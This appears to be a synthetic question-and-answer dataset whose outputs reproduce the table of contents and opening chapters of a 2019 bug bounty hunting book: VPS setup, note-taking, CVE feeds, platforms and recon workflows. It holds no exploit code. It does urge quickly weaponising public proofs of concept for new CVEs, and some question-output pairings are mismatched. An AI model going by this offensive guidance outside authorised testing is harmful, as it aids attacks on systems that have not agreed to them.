[
  {
    "input": "What are the key topics and concepts covered in the sections related to reconnaissance and fingerprinting in the document?",
    "summary": "The text outlines the preparation and reconnaissance phases for a bug bounty campaign. It covers infrastructure setup, including VPS, laptops, and virtualization, as well as organizational tools like checklists and Notion. The document also details various workflows for content discovery, subdomain enumeration, and JavaScript inspection, along with methods for reconnaissance such as CIDR range analysis, reverse whois, and Google dorking.",
    "output": "Page | 2\nSection 1: Pre Game 14\nIntroduction 14\nChapter 1: Pre Game - Infrastructure 15\nIntroduction 15\nVirtual Private Server (VPS) 15\nLaptop/Desktop 17\nVirtualization 17\nSummary 18\nChapter 2: Pre Game - Organization 19\nIntroduction 19\nCheck List 19\nIntroduction 19\nOWASP Checklist 20\nConclusion 21\nNotes 21\nIntroduction 21\nNotion 22\nIntroduction 22\nWiki 23\nTargets 24\nOther 25\nConclusion 26\nLogging 27\nBurp Suite Logs 27\nIntroduction 27\nBurp Logs 27\nConclusion 27\nSummary 28\nGhostlulz AKA Alex Thomas\nPage | 3\nChapter 3: Pre Game - Knowledge Base 29\nIntroduction 29\nCVE Feed 29\nIntroduction 29\n\nNIST 30\nTwitter 30\nGitHub 31\nConclusion 32\nRSS Feeds 32\nIntroduction 32\nInoreader 32\nConclusion 34\nSocial Media 34\nTweetdeck 34\nReddit 35\nOther 35\nConclusion 36\nSummary 36\nChapter 4: Bug bounty 101 37\nPicking the Platform 37\nIntroduction 37\nHackerone 37\nBug Crowd 39\nConclusion 40\nPicking the right target 41\nIntroduction 41\nScope 41\nAge 41\nPay out 41\nConclusion 42\nGhostlulz AKA Alex Thomas\nPage | 4\nSummary 42\nChapter 5: Methodology - Workflows 43\nIntroduction 43\nRecon Workflow 43\nIntroduction 43\nTraditional Workflow 44\nDomain 45\n\nCIDR 45\n\nIP 45\nWeb Applications 46\nConclusion 46\nGitHub Workflow 47\nIntroduction 47\nWorkflow 47\nConclusion 48\nCloud Workflow 48\nIntroduction 48\nWorkflow 48\nConclusion 49\nGoogle Dork Workflow 50\nIntroduction 50\nWorkflow 50\nConclusion 51\nLeaked Credentials Workflow 51\nIntroduction 51\nWorkflow 51\nConclusion 53\nExploit Workflows 53\nNew CVE Workflow 53\nIntroduction 53\nGhostlulz AKA Alex Thomas\nPage | 5\nWorkflow 54\nConclusion 55\nKnown Exploit/Misconfiguration Workflow 55\nIntroduction 55\nWorkflow 56\nConclusion 56\nCMS Workflow 57\nIntroduction 57\nWorkflow 58\nConclusion 58\nOWASP Workflow 59\nIntroduction 59\nWorkflow 59\nConclusion 60\nBrute Force Workflow 60\nIntroduction 60\nWorkflow 61\nConclusion 61\nSummary 62\nSection 2: Reconnaissance 64\nIntroduction 64\nChapter 6: Reconnaissance Phase 1 65\nIntroduction 65\nCIDR Range 66\nIntroduction 66\n\nASN 66\nIntroduction 66\nASN Lookup 67\nConclusion 68\nReverse Whois 68\nGhostlulz AKA Alex Thomas\nPage | 6\nIntroduction 68\nReverse whois 69\nConclusion 70\nReverse DNS 70\nIntroduction 70\nReverse Name server 71\nReverse Mail Server 72\nReverse IP 73\nConclusion 73\nGoogle Dork 73\nIntroduction 73\nDork 74\nConclusion 75\nTools 75\nAmass 75\nIntroduction 75\nInstallation 76\n\nASN 76\n\nCIDR 77\nReverse Whois 78\nConclusion 78\nSummary 79\nChapter 7: Reconnaissance Phase 2 80\nWordlist 80\nIntroduction 80\nSec List 80\nIntroduction 80\nRobots Disallow 80\n\nRAFT 81\nTechnology Specific 81\nGhostlulz AKA Alex Thomas\nPage | 7\nConclusion 83\nCommon Speak 83\nAll 83\n\nCRTSH 84\nConclusion 84\nSubdomain Enumeration 85\nIntroduction 85\nCertification Transparency Logs 86\nIntroduction 86\nCertification Transparency Logs 86\nTools 87\nConclusion 88\nSearch Engine 88\nForward DNS 89\nIntroduction 89\nRapid 7 Forward DNS 90\nConclusion 90\nGitHub 91\nBrute Force 92\nIntroduction 92\nGobuster 92\nConclusion 93\nSubdomain Permutation 94\nOther 95\nTools 95\nAmass 95\nKnock.py 96\nConclusion 97\nDNS Resolutions 98\nScreen shot 99\nGhostlulz AKA Alex Thomas\nPage | 8\nContent Discovery 100\nIntroduction 100\nSelf Crawl 101\nWayback machine crawl data 102\nCommon crawl data 104\nDirectory brute force 105\nConclusion 106\nInspecting JavaScript Files 107\nIntroduction 107\nLink Finder 107\nJssearch 108\nGoogle Dorks 109\nIntroduction 109\nDork Basics 110\nThird Party Vendors 111\nContent 114\nConclusion 115\nSummary 116\nChapter 8: Fingerprint Phase 117\nIntroduction 117"
  },
  {
    "input": "What are the key tools and techniques discussed in the exploitation phase of the text?",
    "summary": "The text covers various tools and techniques for network reconnaissance and exploitation, including Shodan, Nmap, Masscan, and methods for identifying vulnerabilities in web applications, cloud storage, and APIs. It also discusses common exploitation strategies such as subdomain takeover, misconfigured cloud storage buckets, and unauthenticated access to Elasticsearch and Docker APIs. The content includes an overview of CMS systems like WordPress and Joomla, as well as vulnerabilities related to .git and .svn repositories.",
    "output": "IP 118\nIntroduction 118\nShodan 118\nCencys 122\nNmap 123\nMasscan 123\nConclusion 125\nWeb Application 125\nIntroduction 125\nWappalyzer 126\nGhostlulz AKA Alex Thomas\nPage | 9\nFirewall 127\nConclusion 129\nSummary 129\nSection 3: Exploitation Phase 131\nIntroduction 131\nChapter 9: Exploitation Easy Wins 132\nIntroduction 132\nSubdomain Takeover 132\nIntroduction 132\nSubdomain Takeover 133\nConclusion 135\nGitHub 135\nIntroduction 135\nGitHub Dorks 136\nCompany GitHub 138\nConclusion 141\nMisconfigured Cloud Storage Buckets 141\nIntroduction 141\nAWS S3 Bucket 142\nIntroduction 142\nS3 Bucket Dorks 142\nS3 Bucket Brute force 143\nConclusion 144\nGoogle Cloud Storage 144\nDigital ocean Spaces 145\nAzure Blob 146\nConclusion 146\nElastic Search DB 147\nIntroduction 147\nElasticsearch Basics 147\nGhostlulz AKA Alex Thomas\nPage | 10\nUnauthenticated Elasticsearch DB 148\nConclusion 153\nDocker API 153\nIntroduction 153\nExposed Docker API 153\nConclusion 156\nKubernetes API 156\nIntroduction 156\nExposed Kubernetes API 157\nConclusion 160\n.git / .svn 161\nIntroduction 161\nGit 161\nSubversion 163\nConclusion 165\nSummary 165\nChapter 10: Exploitation CMS 166\nIntroduction 166\nWordPress 166\nJoomla 168\nDrupal 169\nAdobe AEM 170\nOther 170\nSummary 173\nChapter 11: Exploitation OWASP 174\nIntroduction 174\nXML External Entity (XXE) 174\nIntroduction 174\nXML Basics 175"
  },
  {
    "input": "What are the key steps and tools recommended for setting up a professional infrastructure and organization before engaging in bug bounty hunting?",
    "summary": "Before starting bug bounty hunting, set up your infrastructure with a VPS and necessary tools like Kali Linux. Stay organized by using a checklist and note-taking tools such as Notion or Evernote to track your progress and ensure consistency. Maintain a knowledge base by following CVE feeds and the infosec community to stay updated on new vulnerabilities and techniques.",
    "output": "XXE 176\nGhostlulz AKA Alex Thomas\nPage | 11\nConclusion 178\nCross Site Scripting (XSS) 179\nIntroduction 179\nReflected XSS 179\nStored XSS 181\n\nDOM XSS 183\nStored XSS via SVG file 183\nServer Side Request Forgery (SSRF) 186\nIntroduction 186\n\nSSRF 186\nConclusion 188\nCross Site Request Forgery (CSRF) 189\nIntroduction 189\n\nCSRF 189\nConclusion 192\nSQL Injection (SQLI) 192\nIntroduction 192\n\nSQLI 192\nConclusion 199\nCommand Injection 200\nIntroduction 200\nCommand Injection 200\nConclusion 204\nCross Site Web Socket Hijacking (CSWSH) 204\nIntroduction 204\nWeb Sockets 204\n\nCSWSH 206\nConclusion 211\nSummary 211\nGhostlulz AKA Alex Thomas\nPage | 12\nGhostlulz AKA Alex Thomas\nPage | 13\nCopyright © 2019 by Alex O. Thomas\nAll rights reserved. This book or any portion thereof\nmay not be reproduced or used in any manner whatsoever\nwithout the express written permission of the publisher\nexcept for the use of brief quotations in a book review. Ghostlulz.com\nGhostlulz AKA Alex Thomas\nPage | 14\nSection 1: Pre-Game\nIntroduction\nEvery game has a playbook; the breakdown of actions (plays) you chose to\nfollow to work through a process. Jumping in feet first without identifying the goal\nand knowing the play which will help you get there will lessen your chances of\nfinding vulnerabilities, and ultimately minimize the potential to make a profit from\nyour bug bounty hunting. The key to a successful hunt is to do some pre-game\nplanning to ensure you are setting yourself up for success! Start by establishing\nyour infrastructure, finding your knowledge base, identifying and securing the\ntools you will use, and creating a general game plan outlining how you will work\nthrough the process...this is your play. Once everything is mapped out you can\nexecute the play and start finding vulnerabilities! Ghostlulz AKA Alex Thomas\nPage | 15\nChapter 1: Pre-Game - Infrastructure\nIntroduction\nBefore you start an engagement, you need to set up the necessary infrastructure. You don’t want to have an engagement delayed or have time wasted by not\nhaving the necessary infrastructure in place. You will need external\ninfrastructure, virtual machines, API keys, and your tooling ready to go before\nyou do anything. In this section I will offer you my personal opinion on what you\nshould include in your infrastructure setup, based on past engagement\nexperiences. Virtual Private Server (VPS)\nIt's a good idea to purchase a virtual private server (VPS) to use for testing. If\nyour testing a vulnerability that requires the target system to call back to your\nsystem like remote code execution (RCE) or service side requests forgery\n(SSRF) it will be hard to do with your home firewall blocking outside connections. For the target server to interact with your home computer you would have to\nopen a port and forward traffic to your computer which is a horrible idea as it will\nleave that port open for the world to see. It’s better to buy a VPS that has a public\nIP so you can easily receive call backs from your payloads. A list of popular VPS\nproviders can be found below:\nGhostlulz AKA Alex Thomas\nPage | 16\nName Website Ratting Notes\nAmazon https://aws.amazon.com/ 4.8/5 One of the nice things\nWeb about AWS is that they\nServices let you pay by the hour. (AWS) EC2 You can also use a pre-\nInstance built Kali image which\nis a huge advantage. Digital https://www.digitalocean.com/ 4.5/5 Digital ocean is a\nOcean reputable hosting\nprovider. They have\nbeen around for a long\ntime and I have never\nhad an issue with them. OVH https://www.ovh.com/ 4.2/5 OVH is another reliable\nprovider. Even with\ntheir popularity they\nstill have some of the\nlowest prices I’ve seen. If you’re in the USA\nyour credit card might\nflag these guys as fraud\nwhich can be annoying. A2 Hosting https://www.a2hosting.com/ 4.0/5 I really like A2 hosting\nthey have low prices\nand I always get my\nmachines within 30 min\nof purchasing them. So,\nif you’re in a rush and\nneed a VPS quick these\nguys are it. Liberty VPS https://libertyvps.net/ 4.0/5 This provider is very\npricy but if you want\nyour purchase to be\nanonymous they accept\nBitcoin. There are a lot more options than these, if you want a full list just search for “VPS\nproviders” on Google. I would suggest getting a cheap VPS with a Debian or\nubuntu OS installed, this should cost $5 - $20 a month. Some hosting providers\nsuch as AWS offer Kali Linux images as well if you want a system that's ready to\ngo from the start. Ghostlulz AKA Alex Thomas\nPage | 17\nLaptop/Desktop\nPeople often ask “what is the best hardware for hacking?” and my answer is\nalways the same. It doesn't matter if your using a 10k rig or a $500 laptop you\npurchased off on eBay, as long as you have the tools to access the web, and the\nminimums listed below you are good to go! That being said, some minimum\nspecs you can start with include any operating system, 8GB RAM, a 250GB hard\ndrive, along with the information in this book will set you up to start hunting! Virtualization\nI try not to clutter my main system with a bunch of hacking tools, notes, and\neverything else I use during an engagement. I find it easier to use a virtual\nmachine for all of my hacking activities. VMware and Virtual box are the two most\npopular hypervisors. ● https://www.virtualbox.org/\n● https://www.vmware.com/\nOnce you have that downloaded, you’re going to want to setup your virtual\nmachine. You can use any Linux distro but I would suggest using kali Linux as it\ncomes pre built with a bunch of tools. ● https://www.kali.org/downloads/\nGhostlulz AKA Alex Thomas\nPage | 18\nSummary\nMake sure you properly set up your infrastructure and tooling before you start\nhacking. Nothing is more annoying than trying to get RCE and realizing you need\nto buy a VPS which could take up to 48 hours depending on the provider. You\nshould have everything needed to do your job before you start your engagement. This means getting your VPS, downloading kali to a VM, installing all of your\ntools, buying all of your API keys, and anything else you need to prepare\nyourself. Ghostlulz AKA Alex Thomas\nPage | 19\nChapter 2: Pre-Game - Organization\nIntroduction\nIf you plan on doing this professionally you need to act professionally. This\nmeans you need to be highly organized like a company or a nation state. Staying\norganized will greatly help you in the long run. Making sure to properly document\nyour steps, tool output, and what you have done on the engagement will greatly\nimprove your success rate, especially if you’re going to be engaging your target\nover days, months, and even years. You don’t want to be wasting man hours\nduplicating work and re running tools. You could spend days gathering recon\ndata for a target. It would be pointless if you didn’t save this data somewhere,\nyou would have to go through the same recon process over and over again. It\nwould also be just as pointless if you saved this data off somewhere but couldn't\nfind it when you needed it. You also want to make sure that what you are doing is\nrepeatable and clearly defined. Following checklist will ensure that each target\nreceives a certain level of testing. You can also use the checklist later down the\nroad to see what was tested and what was skipped over. Check List\nIntroduction\nSometimes while testing a target you feel like you have looked at everything and\nthat there is nothing else to test. How do you really know that you have tested\neverything, do you have a checklist? Having a checklist will allow you to truly try\nGhostlulz AKA Alex Thomas\nPage | 20\neverything and you can see exactly what wasn’t tested. You shouldn’t be trying to\nrecall these things from memory. Six months down the road you might come\nback to this target wondering what you have done, a checklist will allow you to\neasily answer this quest. OWASP Checklist\nHacking is a science and an art. A checklist provides you with a consistent\nrepeatable process that can be used for almost every application. This will allow\nyou to have a repeatable process and be more consistent with your testing. A\nfew people were kind enough to put together a nice checklist based off of the\nOWASP testing guide:\n• https://github.com/tanprathan/OWASP-Testing-Checklist\nFigure 1: OWASP pentesting checklist\nGhostlulz AKA Alex Thomas\nPage | 21\nThis is a huge checklist and covers almost everything when manually testing an\napplication. It makes it very easy to keep track of what you have test and what\nstill needs to be looked at. Over time you will end up adding to this list or\ndeveloping your own custom checklist. Hacking is a science and an art; you must\nfind what works best for you. Conclusion\nHaving a checklist is a great way to provide some consistency to your testing,\nbetter organize yourself, and improve your overall success rate. Bug bounty\nhunting can go on for months or even years, you need to have a paper trail so\nyou can easily pick back up on work you did several months ago. This would be\nimpossible if you relied on recalling information from your memory. Notes\nIntroduction\nNo one likes taking notes but it truly does improve your chances of success. If\nyou have been assessing a target for the last 6 months you may want to see\nwhat you did on your first day of testing. The only real way to do this would be to\nlook back at your notes. How are you supposed to remember in detail what you\ndid 6 months ago without notes? Ghostlulz AKA Alex Thomas\nPage | 22\nNotion\nIntroduction\nEveryone has their own way of taking notes and honestly whatever way works\nbest for you is the best way. Some people use json, some use raw text, and\nsome use the markdown language. Some people like Kanban boards, some like\nchecklist, and others want a full wiki page. Notion is capable of doing everything, which is why I like it so much. Notion can\nalso be used on your mobile device. I personally enjoy being able to access my\nstuff no matter where I am, which is why I like tools that can be used on my\ncomputer and my phone. Another benefit is that you can easily use Notion for\ncollaboration. Sharing your workspace will allow others to view your target lists,\nnotes, checklists, to-do lists, and everything else. If your planning on\ncollaborating this tool will allow you to easily coordinate your efforts for maximum\nefficiency. You can download this tool at:\nWebsite OS\nhttps://www.notion.so/ Windows; Mac\nhttps://github.com/puneetsl/lotion Linux (Unofficial Version)\nTable 1: Notion download links\nGhostlulz AKA Alex Thomas\nPage | 23\nWiki\nBefore you can get started with Notion you are going to have to set up your Wiki\npage. It is really up to you how you set this up but I’ll show you a basic example\nof what yours could look like. Figure 2: Notion bug bounty workspace\nAs you can see there is a wiki page called bug bounty and under this I have 4\npages with the name targets, methodology, resources, and assets/ inventory. The targets section holds all of the stuff related to each bug bounty program. The\nmethodology tab is meant to be used as a reference of what I should be doing. The resources page holds links to tutorials and other useful things if I find myself\nGhostlulz AKA Alex Thomas\nPage | 24\nneeding technical help. Finally, the assets / inventory page is where I hold details\nabout my infrastructure such as VPS IPs and login credentials. Targets\nThe targets section is where I place all the information about each bug bounty\noperation. This is where I keep the targets scope, daily notes, scan results, tool\noutput, to-do list, and anything else related to the engagement. Figure 3: Targets section layout\nYour daily notes should be verbose enough that you can replicate what you have\ndone. However, this does NOT mean you have to include every single detail\nthat’s what your logs are for. Ghostlulz AKA Alex Thomas\nPage | 25\nIt is also important to keep track of what you have done and what needs to be\ncompleted. This can be done using a checklist like the one talk about in the last\nsection (OWASP Checklist) but Notion allows us to use of Kanban boards which\nare so much better. Figure 4: Bug bounty Kanban board\nIf you’re working in groups using a Kanban board will easily allow to collaborate\nplus its visually easier to digest what has been done, what’s finished, and whose\nworking on what. Another nice feature is that we can convert between checklists,\nKanban boards, and a few other things with the click a button. Other\nNotion is just one solution that I happen to really like, you need to find what\nworks best for you. Below is a list of some alternative ways to take notes:\nGhostlulz AKA Alex Thomas\nPage | 26\nWebsite Description\nhttps://pentest.ws/ This is a web basic note\ntaking tool specifically\ndesigned for penetration\ntester. It’s fairly nice but it\ncost money to use to use. https://github.com/ehrishirajsharma/SwiftnessX This is another tool designed\nspecifically for penetration\ntester. Unlike pentest.ws this\ntool must be downloaded\nlocally. https://evernote.com/ Evernote is a very popular\nnote taking tool. You can also\nexport your Evernote notes\ndirectly into Notion. https://www.sublimetext.com/ This is a very basic tool for\nnote taking.\n\nSublime is\nnormally ran on Linux\nenvironments\nhttps://notepad-plus-plus.org/ Notepad++ is basically the\nwindows version of sublime. Nothing special just a simple\nnote taking tool\nTable 2: Note taking tools\nIt doesn't matter what you pick the goal here is to conduct yourself as a\nprofessional and stay organized. Conclusion\nYou’re only hurting your future self if you don’t take notes. You can’t expect to\nremember what you did 6 months ago and that’s why you need to take notes. If\nyou want to pick back up on a target you don’t want to be wasting time testing\nthings you already tested. Notes will also help others who wish to pick up your\nwork, that’s something to think about if you ever collaborate with someone else. Ghostlulz AKA Alex Thomas\nPage | 27\nLogging\nBurp Suite Logs\nIntroduction\nBurp Suite is a MUST HAVE if you’re doing web application testing. If you’re\nlooking at a single application or a single endpoint and want to inspect it closely\nBurp is the only tool you will need. Burp will also log every request that is sent to\nand from the application. ● https://portswigger.net/burp\nBurp Logs\nThe http proxy logs that Burp provide are going to be more detailed than the\nnotes you take by hand. These logs will provide you with every request your\nbrowser made, thus allowing you to see exactly what you did and when you did\nit. There have been several instances where I needed to know what I did on an\nengagement that happened several months prior and was able to easily access\nthis information by reviewing my Burp logs, which showed exactly what I did, and\nwhen I did it. In addition to that, I was also able to easily replay my traffic and\nattacks as all the requests were saved. Conclusion\nWhen doing bug bounties, you may spend several days poking at an application. If 6 months go by and you decide to circle back to this application to try again you\nwill need to know exactly what you were doing so you can pick up where you left\nGhostlulz AKA Alex Thomas\nPage | 28\noff. You don’t want to be wasting your valuable time, or efforts, duplicating the\nsame tasks. Summary\nIt’s really important that you stay organized while on an engagement. Bug\nbounties are continuous and it’s not uncommon to test the same target multiple\ntimes throughout the year. You will want to keep track of what has been\nperformed, information gathered, passed vulnerabilities, and anything else that\ncould aid you. As you test an organization over time you will start to understand\ntheir technology stacks, common vulnerabilities they have, and how they operate. Have clear records and notes of what you have learned and done will not only\nhelp you but anyone else who later targets the organization. Ghostlulz AKA Alex Thomas\nPage | 29\nChapter 3: Pre-Game - Knowledge Base\nIntroduction\nOffensive security, hacking, bug bounty hunting, penetration testing, or whatever\nyou want to call it is a huge field. New exploits, methodologies, techniques,\ntechnologies, and tooling are being put out every day. It is important that you stay\nrelevant and up to date. To do so, you are going to need to be plugged into the\ninfosec community. You will need to know where to look for those new CVEs and\nexploits, who to follow for the best techniques and methodologies, and a\ncommunity of people to turn to if you have questions or need someone's\nexpertise. CVE Feed\nIntroduction\nHaving a Common Vulnerabilities and Exposures (CVE) feed is a must in this\nfield, you want to be among the first to know whenever a new vulnerability comes\nout. A general rule is that you will not get paid for a finding that is a duplicate,\nwhich means you must be the first person to make the finding. Having a\nvulnerability feed will alert you to high impact vulnerabilities and allow you to\npounce on your target immediately. Ghostlulz AKA Alex Thomas\nPage | 30"
  },
  {
    "input": "What are the key methods and platforms for staying updated with new CVEs and vulnerabilities in the cybersecurity industry?",
    "summary": "The National Institute of Standards and Technology (NIST) maintains a real-time vulnerability database that can be manually searched. Following industry experts on social media like Twitter and Reddit can help you stay updated on new CVEs and POCs. GitHub is a valuable resource for finding working POCs for vulnerabilities. \n\nTo succeed in bug bounty hunting, you should choose the right platform, such as Hackerone or Bug Crowd, and target companies with large scopes and high payouts. A structured recon workflow, including domain discovery, IP scanning, and web application fingerprinting, is essential for identifying vulnerabilities efficiently.",
    "output": "NIST\nThe National Institute of Standards and Technology (NIST), image is shown\nbelow, maintains one of the best vulnerability databases out there. The NIST\nvulnerability database is constantly being updated with new vulnerabilities in real\ntime as they come out. This database can be manually searched at:\n● https://nvd.nist.gov/vuln/search\nFigure 5: NIST CVE search\nTwitter\nIf you’re active on twitter you can gain insight by checking your feed for new\nCVEs. One Twitter account I follow is @cvenews, which is constantly updated\nwith new CVEs in real-time. This account acts as an RSS feed posting new\nCVEs as they come out. ● https://twitter.com/cvenew?lang=en\nGhostlulz AKA Alex Thomas\nPage | 31\nInstead of searching NIST manually for CVEs you could just keep an eye on that\nuser's tweets. You should also keep an eye on industry experts. These experts\nwill often be some of the first people share a working proof of concept (POC) for\na known CVE as shown below:\nFigure 6: Twitter post of a Joomla CVE with POC\nAs you can see someone shared a Joomla zero day with a working POC. This\ninformation can immediately be leveraged to find vulnerabilities. GitHub\nOne of the biggest issues with new CVEs is the lack of a working proof of\nconcept (POC). Without a working POC, you will have to spend numerous man-\nhours writing a custom exploit. If you lack this skill set you will have to wait for a\npublic POC to be released by someone else. These POCs will typically be\nuploaded to GitHub. It's a good idea to search GitHub for working POCs when a\nnew CVE comes out so you can immediately weaponize it. Ghostlulz AKA Alex Thomas\nPage | 32\nConclusion\nThe key takeaway here is to establish a plan to receive real time updates on\nnewly posted CVEs. Being the first person to know about a new exploit places\nyou in a great position to identify and submit vulnerability before anyone else. Get in the habit of checking new CVEs every day. When a high severity CVE is\nfound look on GitHub for a working POC so you can start targeting systems. If\nyou have the knowledge it may be worth creating your own POC if none is\navailable. RSS Feeds\nIntroduction\nA Really Simple Syndication (RSS) feed reader is a way to fetch the latest\nupdates from an RSS feed. We can make use of RSS feeds to constantly stay\nupdated with relevant information in the cybersecurity world. This will help you\nlearn new techniques, methodologies, and vulnerabilities that are being used in\nreal-time. Inoreader\nInoreader (https://www.inoreader.com) is my favorite RSS reading tool and can\nbe used on multiple platforms such as your desktop, and mobile device via an\napp. Having multiple access options is handy, as it allows you to stay updated in\nreal-time, regardless of your location. Ghostlulz AKA Alex Thomas\nPage | 33\nFigure 7: Inoreader dashboard\nTo ensure I am staying updated I subscribe to several feeds. Name Website Description\nHackerone http://rss.ricterz.me/hacktivity When you submit a bug bounty\nHacktivity report it can end up on the\nhacktivity feed. These are great\nresources to see what people are\nactively finding\nHackerone https://medium.com/feed/tag/hac Hackerones blog can be a great\nBlog kerone resource for new information\nrelevant to the bug bounty field. NIST CVE https://nvd.nist.gov/feeds/xm NIST has a repository of CVEs and\nALL l/cve/misc/nvd-rss.xml this feed will alert you to any new\nones. You should be checking this\nevery day. NIST CVE https://nvd.nist.gov/feeds/xm NIST has a repository of CVEs and\nAnalyzed l/cve/misc/nvd-rss- this feed will alert you to any new\nanalyzed.xml ones. You should be checking this\nevery day. Bug Bounty https://medium.com/feed/bu This is a feed of bug bounty write\nWriteups gbountywriteup ups. Port http://blog.portswigger.net/fe This team is constantly producing\nSwigger eds/posts/default high quality blogs. They are the\ncreator of Burp Suite and you\ndefiantly want to be following\nthem. Ghostlulz AKA Alex Thomas\nPage | 34\nReddit http://www.reddit.com/r/net Reddit needs no introduction. This\nNetsec sec/.rss is one of the best places to get info\nsec news. Threat Post http://threatpost.com/feed/ This feed is about cyber security\nnews and events. Table 3: RSS feeds\nThere is way more feeds than this. To list them all it would take many pages. However, you can search online to find any RSS feed you want. Conclusion\nRSS feeds are a great way to stay updated with the most recent news. You will\nget real- time information and be able to follow new techniques and trends that\nare happening in the industry. If a new trick or CVE comes out you need to be\namong the first to know about it, maximizing your opportunity to submit a\nvulnerability and get paid! Social Media\nTweetdeck\nTwitter is one of the best resources to get real time information. The infosec\ncommunity on twitter is very large and very active. You will need to follow the\nright people and monitor the right hashtags so you can stay up to date with the\nlatest trends in the industry. Tweetdeck is a tool created by twitter to help\norganize a collection of tweets, I use it to monitor different users and hashtags. Ghostlulz AKA Alex Thomas\nPage | 35\nFigure 8: Tweetdeck dashboard\nWith tweet deck we can easily monitor hashtags, users, search terms, and more. Tweetdeck allows you to easily monitor all of these with a single interface all you\nhave to do is set it up. Twitter is a gold mine for information. Reddit\nReddit is another really good source of information. The subreddit “netsec” is by\nfar the most popular place to find infosec news and information. ● https://www.reddit.com/r/netsec/\nOther\nThere are plenty of other social media platforms that contain useful information. You can also utilize YouTube, Facebook groups, slack channels, discord\nchannels, hacking forums, podcasts, and much more. Ghostlulz AKA Alex Thomas\nPage | 36\nConclusion\nSocial media is one of the best places to find tools, techniques, and new\ninformation. Reddit and Twitter seem to be where most of the infosec community\nhangs out so you want to be monitoring those platforms. The most important\nthing here is that you have an ear in the community. Technology changes rapidly\nand new techniques are coming out every day, make sure you’re on social media\nso you can follow the trends. Summary\nIf you’re not progressing, you're regressing. In this field, things are constantly\nchanging and the only way to keep up is to have an ear in the community. If a\nnew CVE, technique, or tool comes out you need to be the first to know about it. Constantly monitoring your CVE feed, RSS feeds, social media feeds, and chat\nrooms will allow you to be the first to know when something gets dropped. You\nneed to keep your knowledge base up to date or your will surely fall behind. Ghostlulz AKA Alex Thomas\nPage | 37\nChapter 4: Bug bounty 101\nPicking the Platform\nIntroduction\nThe first step to beginning your journey into bug bounty hunting is to pick a\nplatform to use. You don’t want to be running around hacking random sites as\nthat is illegal. You need to make sure the target you are testing has agreed to let\nyou do so. To get started all you have to do is sign up at one of the many bug\nbounty programs. Hackerone\nHackerone is one of the most popular and widely used bug bounty platforms out\nthere. Hackerone works with all kinds of companies to bring them to their\nplatform. If a company agrees to be tested you will see them on the “program\ndirectory” list as shown below:\nGhostlulz AKA Alex Thomas\nPage | 38\nFigure 9: Hackerone bug bounty programs\nThe next step involves looking at the “program policy”. This will provide you with\nall the necessary information about the engagement. This document will outline\nthe payout amounts, disclosure policy, out of scope targets, in scope targets, and\nany other relevant information. Ghostlulz AKA Alex Thomas\nPage | 39\nFigure 10: Bug bounty scope\nRemember to pay close attention to the domains that are in scope and any\nendpoints that are out of scope. If you’re doing this to make money you don’t\nwant to waste time testing something that isn’t going to get you paid. Bug Crowd\nThe second most popular bug bounty platform is bug crowd. This platform is\nvery similar to hackerone. You can search for companies who have an active bug\nbounty platform. Ghostlulz AKA Alex Thomas\nPage | 40\nFigure 11: Bugcrowd bug bounty programs\nBug crowd also includes the location where you can report bugs. Not every\ncompany has specifically signed up for a bug bounty platform but that doesn’t\nmean there isn’t a location to submit bugs to them. If you’re doing this to make a\nliving and need money make sure the platform actually gives cash rewards. Some companies only offer bragging rights or a t shirt as a reward. As amazing\nas that is you won’t be able to pay the bills with a cool looking t-shirt. Conclusion\nThere are lots of bug bounty platforms to choose from but the vast majority of\npeople stick to Hackerone and Bug crowd. If you’re just getting started, I would\nrecommend starting out on Hackerone or Bug crowed. Ghostlulz AKA Alex Thomas\nPage | 41\nPicking the right target\nIntroduction\nSimply picking the wrong target can greatly reduce your chances of finding a\nvulnerability. You need to be able to identify those ideal targets that have the\ngreatest chance of a successful payout. Scope\nTargets with small and limited scopes are generally going to have fewer total\nvulnerabilities to be found. The more domains in scope greater the chances you\nwill run into a vulnerability, it’s a numbers game. Age\nOld companies tend to rely more on legacy systems and may have a larger\nfootprint on the internet. This is because old companies have been around longer\nand have stood up, taken down, and updated their external infrastructure more\nthan newer companies. New companies will typically have a smaller footprint on\nthe internet as they haven't been around long enough to stand up a bunch of\ninfrastructure. So, you will typically see better results testing older companies. Pay out\nIf you don’t care about money then this section is irrelevant to you. However, if\nyou like to get paid you will want to target companies that have the highest\npayout. I’ve seen one company pay $1,000 for a vulnerability and another pay\nGhostlulz AKA Alex Thomas\nPage | 42\n$50. If you’re going to be spending time finding bugs you might as well prioritize\ncompanies that have higher payouts. Conclusion\nPicking the right target will make all the difference when doing bug bounties. You\nwant companies with large scopes and lots of assets to go after. If you’re in it for\nthe money you will want to avoid targets that don’t pay. It would be a waste of\ntime if you spent five days on a target to only receive a free pen and t-shirt. Summary\nAs you might have learned by now the bug bounty process starts before you start\nhacking. You need to pick the right platform so you can maximize your success\nrate. From the very beginning of the process you want to set yourself up for the\nbest chance of getting a vulnerability and getting paid. Hackerone and bug crowd\nare two of the most popular bug bounty platforms but don’t forget about those\nhidden programs. When determining which organization to go after you want to\nlook for certain traits. Large scopes, high payouts, and the age of an organization\nare all the features you want to look for in a bug bounty program to maximize\nyour efforts. Ghostlulz AKA Alex Thomas\nPage | 43\nChapter 5: Methodology - Workflows\nIntroduction\nBefore you start trying to hack something you need to come up with a high-level\nplan of attack. The last thing you want to do is randomly do a bunch of stuff and\nget absolutely nowhere. You need to come up with some sort of map or workflow\nof your attack process. This will help you see the big picture and how the\ndifferent parts of your process connect to each other. The easiest way to map out\nyour pentest, bug bounty, or hacking process is to create a flowchart or workflow\nthat describes everything. Don’t worry about getting to detailed with the technical\naspects you just want a high-level picture of what to do. Recon Workflow\nIntroduction\nThe recon workflow can be broken up into a couple different parts. You have\nyour traditional workflow that seems to be a part of everyone's recon process. Then there are some workflows that are non-traditional and fairly unique. I'll be\nbreaking down a few different workflows feel free to combine them to forge your\nown unique way of doing things. Some workflows may work for you while others\nyou may completely fail at it. Everyone is different you have to find what works\nfor you. Hacking is both a science and an art. Ghostlulz AKA Alex Thomas\nPage | 44\nTraditional Workflow\nThe traditional workflow can be found in almost everyone's methodology. It\nseems to be the base that everyone's framework is built from.\n\nThe traditional bug\nbounty workflow will look something like this:\nFigure 12: Traditional workflow flowchart\nAs you can see there really isn't anything to fancy going on here, but that doesn’t\nmean this process won’t bring you vulnerabilities because it most definitely will. However, this process will get refined as you progress through the book. Ghostlulz AKA Alex Thomas\nPage | 45\nDomain\nFirst you will need to pick a company that has a bug bounty program. Next you\nwill need to locate all domains belonging to that company. After you have\ngathered all the root domains you will need to determine the subdomains\nbelonging to each root domain. Next you will perform DNS resolution to\ndetermine the A, NS, MX, and CNAME records of each target. 